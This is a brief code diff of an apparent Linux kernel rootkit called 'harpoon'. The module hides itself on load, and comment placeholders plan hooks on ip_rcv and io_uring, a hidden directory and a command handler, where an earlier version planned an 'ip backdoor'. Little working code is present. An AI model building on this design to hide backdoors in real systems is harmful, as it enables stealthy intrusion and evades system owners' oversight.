@@ -25,9 +25,13 @@ static int __init harpoon_init(void){
     harpoon_mod = harpoon_new_mod(THIS_MODULE);
     harpoon_mod_hide(harpoon_mod);
 
-    // Install ip backdoor
+    // Setup hooking
 
-    // Hide RK tools director
+    // Hook ip_rcv
+
+    // Hook io_uring (if present)
+
+    // Hide harpoon directory
 
     // Start cmd handler
 
@@ -35,7 +39,6 @@ static int __init harpoon_init(void){
 }
 
 static void __exit harpoon_exit(void){
-    printk(KERN_INFO "LKM loaded");
     return;
 }
 
